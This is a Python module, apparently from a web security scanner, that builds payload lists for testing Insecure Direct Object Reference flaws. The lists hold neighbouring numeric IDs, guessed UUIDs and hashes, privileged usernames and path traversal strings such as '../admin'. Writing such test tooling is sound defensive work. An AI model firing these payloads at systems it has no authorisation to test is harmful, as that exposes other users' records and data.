from typing import List, Dict, Any
from utils.payload_loader import PayloadLoader
import re
import uuid

class IDORPayloads:
    """Enhanced IDOR payload collection"""

    @staticmethod
    def get_all_payloads() -> List[str]:
        """Get all IDOR payloads from text file"""
        try:
            return PayloadLoader.load_payloads('idor')
        except:
            # Fallback to hardcoded payloads if file not found
            return IDORPayloads.get_common_payloads()

    @staticmethod
    def get_common_payloads() -> List[str]:
        """Get common IDOR test payloads"""
        return [
            '1', '2', '3', '4', '5', '10', '100', '1000',
            '0', '-1', '-2', '999999', '1234567890',
            'admin', 'administrator', 'root', 'test', 'guest',
            'user1', 'user2', 'demo', 'example',
            '../', '..\\', './', '.\\',
            '%2e%2e%2f', '%2e%2e%5c',
            'null', 'undefined', 'NaN',
            '[]', '{}', '""', "''",
        ]

    @staticmethod
    def get_sequential_payloads(original_value: str) -> List[str]:
        """Generate sequential and contextual payloads based on an original value."""
        payloads = []
        
        # Handle integer values
        if IDORPayloads._is_integer(original_value):
            original_int = int(original_value)
            payloads.extend(IDORPayloads._generate_numeric_payloads(original_int))
        
        # Handle UUID-like values
        elif IDORPayloads._is_uuid_like(original_value):
            payloads.extend(IDORPayloads._generate_uuid_payloads())
        
        # Handle hash-like values
        elif IDORPayloads._is_hash_like(original_value):
            payloads.extend(IDORPayloads._generate_hash_payloads())
        
        # Handle string values
        elif isinstance(original_value, str) and len(original_value) > 0:
            payloads.extend(IDORPayloads._generate_string_payloads(original_value))
        
        # Always add common test values
        payloads.extend(IDORPayloads._get_common_test_values())
        
        return list(set(payloads))

    @staticmethod
    def get_contextual_payloads(parameter_name: str, original_value: str) -> List[str]:
        """Generate payloads based on parameter name context"""
        payloads = []
        param_lower = parameter_name.lower()
        
        # User-related parameters
        if any(keyword in param_lower for keyword in ['user', 'account', 'profile', 'member']):
            payloads.extend(['1', '2', 'admin', 'administrator', 'root', 'test'])
        
        # Document/File related parameters
        elif any(keyword in param_lower for keyword in ['doc', 'file', 'document', 'report']):
            payloads.extend(['1', '2', '3', 'test.pdf', 'admin.doc', 'config.txt'])
        
        # Order/Transaction related parameters
        elif any(keyword in param_lower for keyword in ['order', 'transaction', 'payment', 'invoice']):
            payloads.extend(['1', '2', '100', '1000', '9999'])
        
        # Message/Post related parameters
        elif any(keyword in param_lower for keyword in ['message', 'post', 'comment', 'ticket']):
            payloads.extend(['1', '2', '10', '100'])
        
        # Add sequential payloads based on original value
        payloads.extend(IDORPayloads.get_sequential_payloads(original_value))
        
        return list(set(payloads))

    @staticmethod
    def _is_integer(value: str) -> bool:
        """Check if value is an integer"""
        try:
            int(value)
            return True
        except (ValueError, TypeError):
            return False

    @staticmethod
    def _is_uuid_like(value: str) -> bool:
        """Check if value looks like a UUID"""
        uuid_pattern = r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'
        return bool(re.match(uuid_pattern, value, re.IGNORECASE))

    @staticmethod
    def _is_hash_like(value: str) -> bool:
        """Check if value looks like a hash"""
        if len(value) in [32, 40, 64, 128]:  # MD5, SHA1, SHA256, SHA512 lengths
            return bool(re.match(r'^[0-9a-f]+$', value, re.IGNORECASE))
        return False

    @staticmethod
    def _generate_numeric_payloads(original_int: int) -> List[str]:
        """Generate numeric payloads around the original integer"""
        payloads = []
        
        # Sequential values
        for i in range(1, 6):
            payloads.append(str(original_int + i))
            if original_int - i > 0:
                payloads.append(str(original_int - i))
        
        # Edge cases
        payloads.extend([
            '0', '1', '-1', '999999', '1000000',
            str(original_int * 2), str(original_int * 10),
            str(max(1, original_int // 2)), str(max(1, original_int // 10))
        ])
        
        return payloads

    @staticmethod
    def _generate_uuid_payloads() -> List[str]:
        """Generate UUID-like payloads"""
        return [
            '00000000-0000-0000-0000-000000000000',
            '11111111-1111-1111-1111-111111111111',
            'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa',
            str(uuid.uuid4()),  # Random UUID
            'admin-admin-admin-admin-adminadmin',
            'test-test-test-test-testtesttest'
        ]

    @staticmethod
    def _generate_hash_payloads() -> List[str]:
        """Generate hash-like payloads"""
        return [
            '0' * 32,  # MD5 zeros
            '1' * 32,  # MD5 ones
            'a' * 32,  # MD5 a's
            '0' * 40,  # SHA1 zeros
            '1' * 40,  # SHA1 ones
            'a' * 40,  # SHA1 a's
            '0' * 64,  # SHA256 zeros
            'admin' * 6 + 'ad',  # 32 chars
            'test' * 8,  # 32 chars
        ]

    @staticmethod
    def _generate_string_payloads(original_value: str) -> List[str]:
        """Generate string-based payloads"""
        payloads = []
        
        # Case variations
        payloads.extend([
            original_value.upper(),
            original_value.lower(),
            original_value.capitalize()
        ])
        
        # Common substitutions
        if 'user' in original_value.lower():
            payloads.extend(['admin', 'administrator', 'root', 'test'])
        
        # Append/prepend common values
        payloads.extend([
            original_value + '1',
            original_value + '2',
            '1' + original_value,
            '2' + original_value,
            'admin' + original_value,
            original_value + 'admin'
        ])
        
        return payloads

    @staticmethod
    def _get_common_test_values() -> List[str]:
        """Get common test values for IDOR testing"""
        return [
            '1', '2', '0', '-1', '100', '999',
            'admin', 'test', 'guest', 'demo',
            'null', 'undefined', '',
            '../admin', '../user', '../root'
        ]

    @staticmethod
    def get_payload_metadata() -> Dict[str, Any]:
        """Get metadata about IDOR payloads"""
        return {
            'name': 'IDOR Payloads',
            'description': 'Payloads for testing Insecure Direct Object Reference vulnerabilities',
            'category': 'Access Control',
            'severity': 'High',
            'cwe': 'CWE-639',
            'owasp': 'A01:2021 – Broken Access Control'
        }
